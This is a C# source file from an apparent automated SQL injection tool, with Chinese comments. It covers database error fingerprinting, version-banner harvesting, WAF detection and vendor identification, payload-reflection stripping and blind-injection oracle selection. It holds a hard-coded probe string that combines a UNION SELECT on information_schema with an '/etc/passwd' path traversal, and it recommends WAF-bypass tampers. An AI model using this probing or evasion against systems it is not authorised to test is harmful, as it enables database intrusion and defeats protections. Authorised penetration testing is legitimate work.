using Avalonia.Styling;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.ViewModels;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
namespace SuperSQLInjectionV2.Tools
{
    public partial class InjectTools
    {
        public static List<string> ScanDbByError(string body)
        {
            List<string> list_Find_Database = new List<string>();
            if (string.IsNullOrEmpty(body))
            {
                return list_Find_Database;
            }
            foreach (string name in Inject.ErrorFingerprints.MatchDbms(body))
            {
                if (!list_Find_Database.Contains(name))
                {
                    list_Find_Database.Add(name);
                }
            }
            //检测期泄漏收割：错误页/指纹响应常带出版本号，收进常见值预测候选（取数时1次等值确认即可，零成本预测）
            if (list_Find_Database.Count > 0)
            {
                HarvestLeakedValues(body);
            }
            return list_Find_Database;
        }

        /// <summary>
        /// 检测期泄漏收割：从错误页/指纹响应提取版本号等已泄漏值，写入常见值预测的会话学习候选（Banners分区）。
        /// 信息已经拿到手，预测时1次等值请求即可确认整串，无需逐字符盲读
        /// </summary>
        [GeneratedRegex(@"(?:MariaDB|MySQL)[^\d]{0,30}(\d+\.\d+\.\d+[\w\-]*)", RegexOptions.IgnoreCase)]
        private static partial Regex LeakMysqlVerRegex();
        [GeneratedRegex(@"PostgreSQL\s+(\d+\.\d+[\w\.\-]*)", RegexOptions.IgnoreCase)]
        private static partial Regex LeakPgVerRegex();
        [GeneratedRegex(@"Microsoft SQL Server\s+((?:\d{4}|\d+\.\d+)[\w\.\- ]{0,20})", RegexOptions.IgnoreCase)]
        private static partial Regex LeakMssqlVerRegex();

        private static void HarvestLeakedValues(string body)
        {
            try
            {
                foreach (Regex re in new[] { LeakMysqlVerRegex(), LeakPgVerRegex(), LeakMssqlVerRegex() })
                {
                    Match m = re.Match(body);
                    if (m.Success)
                    {
                        string ver = m.Groups[1].Value.Trim();
                        if (ver.Length >= 5 && ver.Length <= 64)
                        {
                            Models.Data.CommonOutputPredictor.Learn("Banners", ver);
                        }
                    }
                }
            }
            catch (Exception ex) { Log.SysLog("banner学习异常：" + ex.Message); }
        }
        private static readonly Random _detectRand = new Random();

        /// <summary>
        /// WAF启发式探测并向厂商指纹识别升级：
        /// 1.被动指纹——正常响应的头/Cookie即暴露厂商特征（如cf-ray、safedog-flow-item）；
        /// 2.主动指纹——向参数发送典型攻击特征串，匹配拦截页/拦截Cookie的厂商特征；
        /// 3.状态码突变兜底——无指纹命中时按状态码跳变启发式告警。
        /// </summary>
        public static async Task<List<string>> CheckWaf(AppConfig AppConfig, string requestTxt, string pname, string pvalue)
        {
            var identified = new List<string>();
            try
            {
                HttpRequest request = new HttpRequest(AppConfig, requestTxt);
                HttpResponse coserver = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);

                //1.被动指纹：正常响应直接识别（手工规则层 + identywaf正则层）
                var passiveHits = WafFingerprint.Identify(coserver, false);
                passiveHits.AddRange(WafFingerprint.IdentifyByIdentYwaf(coserver));
                foreach (string h in passiveHits)
                {
                    Log.Warning("被动指纹识别到WAF/IPS：" + h);
                }
                identified = WafFingerprint.Vendors(passiveHits);

                string payload_paramData = pvalue + ConstData.GetParamAndEncode("");
                string payload_request = RequestRewriter.SetInjectToRequest(request.HeaderAndBody, RequestRewriter.SetInject(request.Params, pname, payload_paramData));
                HttpRequest hr = new HttpRequest(AppConfig, payload_request);
                //典型攻击特征噪声串
                hr.Payload = " and 1=1 union all select 1,2,3,table_name from information_schema.tables where 2>1--'\");|&*/../../etc/passwd";
                HttpResponse wafServer = await HTTPTool.SendRequestRetryAsync(hr).ConfigureAwait(false);

                //2.主动指纹：攻击响应中的厂商特征（拦截页文案/拦截Cookie；手工规则层 + identywaf正则层）
                var activeHits = WafFingerprint.Identify(wafServer, true);
                activeHits.AddRange(WafFingerprint.IdentifyByIdentYwaf(wafServer));
                bool activeNew = false;
                foreach (string h in activeHits)
                {
                    if (!passiveHits.Contains(h))
                    {
                        activeNew = true;
                        Log.Warning("攻击特征串响应命中WAF指纹：" + h);
                    }
                }

                //3.状态码突变兜底
                int[] wafCodes = { 403, 406, 501, 999 };
                if (!ConstData.ErrorHttpCode.Contains(coserver.StatusCode) && wafServer.StatusCode != coserver.StatusCode)
                {
                    if (wafCodes.Contains(wafServer.StatusCode) || wafServer.StatusCode == 0)
                    {
                        Log.Warning($"目标对攻击特征串返回了异常状态码({coserver.StatusCode}→{wafServer.StatusCode})，疑似存在WAF/IPS防护！建议配置绕过模板后再测试。");
                        return identified;
                    }
                }
                string[] wafKeys = { "access denied", "request blocked", "not acceptable", "拦截" };
                string body = wafServer.BodyTxt ?? "";
                string srcBody = coserver.BodyTxt ?? "";
                foreach (string key in wafKeys)
                {
                    if (body.Contains(key, StringComparison.OrdinalIgnoreCase) && !srcBody.Contains(key, StringComparison.OrdinalIgnoreCase))
                    {
                        Log.Warning("攻击特征串响应中命中WAF特征词[" + key + "]，疑似存在WAF/IPS防护！建议配置绕过模板后再测试。");
                        return identified;
                    }
                }
                if (passiveHits.Count > 0 || activeNew)
                {
                    identified = WafFingerprint.Vendors(passiveHits.Concat(activeHits).ToList());
                    Log.Warning("WAF指纹汇总：" + string.Join("、", identified) + "。建议配置对应绕过模板（编码/脚本tamper）后再测试。");
                    //识别到具体厂商后给出编码工具候选优先级提示（仅提示不自动启用，避免误排序引入回归）
                    var tampers = WafFingerprint.RecommendTampers(identified);
                    if (tampers.Count > 0)
                    {
                        Log.Warning("按识别结果推荐编码工具优先级（编码处理页手动启用验证）：" + string.Join(" → ", tampers));
                    }
                }
                else
                {
                    Log.Show("WAF启发式探测未发现明显防护特征！");
                }
            }
            catch (Exception wafEx)
            {
                //WAF探测失败不影响正常检测，但记录便于排查
                Log.SysLog("WAF启发式探测异常：" + wafEx.Message);
            }
            return identified;
        }


        /// <summary>
        /// 判断响应是否包含已知数据库错误指纹。
        /// 用于Union列数/显示位探测时排除错误页：MySQL等错误消息会携带截断的SQL反射，
        /// 截断反射无法被完整ReflectionValue剔除，残留探针串会造成列数/显示位误判。
        /// 指纹唯一事实源：config/injection/errors.xml（手工指纹已合并为正则条目，上游同步+本地增补一体管理）。
        /// </summary>
        public static bool IsDbErrorPage(string? body)
        {
            if (string.IsNullOrEmpty(body))
            {
                return false;
            }
            return Inject.ErrorFingerprints.IsErrorPage(body);
        }

        /// <summary>
        /// 剔除响应中回显的payload（原文及URL编码形态），
        /// 避免payload回显导致真值页与模板的相似度被人为拉低（对反射内容的处理）
        /// </summary>
        public static string StripPayloadReflection(string pageText, string payload)
        {
            if (string.IsNullOrEmpty(pageText) || string.IsNullOrEmpty(payload))
            {
                return pageText ?? "";
            }
            string result = pageText.Replace(payload, "", StringComparison.Ordinal);
            //实际发送使用URLEncode.UrlEncode（保留'-等），href/src中的编码回显同形态；
            //EscapeDataString形态兜底（编码'为%27的场景）；
            //HtmlEncode形态覆盖服务端将payload回显到HTML正文/错误消息的场景（' → &#39;）
            foreach (string encoded in new[] { URLEncode.UrlEncode(payload), Uri.EscapeDataString(payload), System.Net.WebUtility.HtmlEncode(payload) })
            {
                if (!encoded.Equals(payload, StringComparison.Ordinal))
                {
                    result = Regex.Replace(result, Regex.Escape(encoded), "", RegexOptions.IgnoreCase);
                }
            }
            return result;
        }

        /// <summary>
        /// 注释符联动：按数据库类型重写请求报文注入标记（$sql$）后紧跟的注释符，
        /// 与InjectDetectEngine.ExploitMarkedValue的生成规则保持一致（MySQL=#，Access/未知=无，其他=-- ）。
        /// 只处理紧邻$sql$的注释符，suffix边界原样保留（无注释时suffix参与括号配平，有注释时被注释掉均合法）。
        /// 用于：恢复注入记录后手动切换数据库类型、检测记录数据库类型被纠正等场景
        /// </summary>
        public static string UpdateMarkedComment(string requestTxt, DBType db)
        {
            if (string.IsNullOrEmpty(requestTxt))
            {
                return requestTxt ?? "";
            }
            int idx = requestTxt.IndexOf(ConstData.InjectStr, StringComparison.Ordinal);
            if (idx < 0)
            {
                return requestTxt;
            }
            int start = idx + ConstData.InjectStr.Length;
            string head = requestTxt.Substring(0, start);
            string rest = requestTxt.Substring(start);
            //剥掉旧注释符（boundary suffix不会以#或--开头，不会误剥）
            if (rest.StartsWith("#", StringComparison.Ordinal))
            {
                rest = rest.Substring(1);
            }
            else if (rest.StartsWith("-- ", StringComparison.Ordinal))
            {
                rest = rest.Substring(3);
            }
            else if (rest.StartsWith("--", StringComparison.Ordinal))
            {
                rest = rest.Substring(2);
            }
            string comment = db switch
            {
                DBType.MySQL => "#",
                DBType.Access => "",
                DBType.UnKnow => "",
                _ => "-- "
            };
            string result2 = head + comment + rest;
            return result2.Equals(requestTxt, StringComparison.Ordinal) ? requestTxt : result2;
        }

        public static InjectPoint CheckTheKey(AppConfig AppConfig, HttpResponse trueServer, HttpResponse falseServer, HttpResponse oldServer)
        {
            //判断关键字,body中的词
            //记录trueServer状态码，后面判断，降低误报
            InjectPoint point = new InjectPoint();
            string key = TruthOracle.FindKeyByStr(trueServer.BodyClearText, falseServer.BodyClearText, oldServer.BodyTxt);
            point.Revers = false;
            //如果为空反过来查找
            if (string.IsNullOrEmpty(key))
            {
                Log.Show("Body响应内容中正向查找未发现盲注判断值！");
                point.Revers = true;
                key = TruthOracle.FindKeyByStr(falseServer.BodyClearText, trueServer.BodyClearText, oldServer.BodyTxt);
                if (string.IsNullOrEmpty(key))
                {
                    Log.Show("Body响应内容中反向查找未发现盲注判断值！");
                    point.Revers = false;
                }
            }
            if (!string.IsNullOrEmpty(key))
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.KeyWord;
                point.CheckValue = key;
                Log.Show("发现盲注判断值！" + key);
                return point;
            }
            //状态码判断
            int code = TruthOracle.FindKeyByCode(trueServer.StatusCode, falseServer.StatusCode);
            if (code == 0)
            {
                Log.Show("响应状态码不能作为盲注判断条件！");
            }
            else
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.Code;
                point.CheckValue = code.ToString();
                Log.Show("响应状态码可以作为盲注判断条件！");
                return point;
            }
            //时间判断
            if (trueServer.RunTime < AppConfig.SleepInjectMaxTime && falseServer.RunTime < AppConfig.SleepInjectMaxTime)
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.Time;
                point.CheckValue = AppConfig.SleepInjectMaxTime.ToString();
                Log.Show("逻辑为真的响应时间可以作为盲注判断条件！");
                return point;
            }
            if (falseServer.RunTime < AppConfig.SleepInjectMaxTime && trueServer.RunTime < AppConfig.SleepInjectMaxTime)
            {
                point.IsInject = true;
                point.BoolInjectType = BoolInjectType.Time;
                point.CheckValue = AppConfig.SleepInjectMaxTime.ToString();
                point.Revers = true;
                Log.Show("逻辑为假的响应时间可以作为盲注判断条件！");
            }
            return point;
        }
    }
}
